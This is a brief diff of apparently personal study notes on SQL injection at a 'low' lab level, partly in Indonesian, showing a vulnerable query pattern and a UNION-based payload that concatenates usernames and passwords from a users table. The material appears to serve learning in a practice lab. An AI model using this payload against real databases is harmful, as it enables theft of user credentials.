@@ -1,4 +1,4 @@
--- Sql Inject --
+-- Low Sql Inject
 
 Where ID =  '$id'
 
@@ -17,7 +17,6 @@ nama table dan nama kolom
 
 table user
 kolom user, pw
-
 
 2' union select 1, concat(user, '::', password) from users -- -'
 
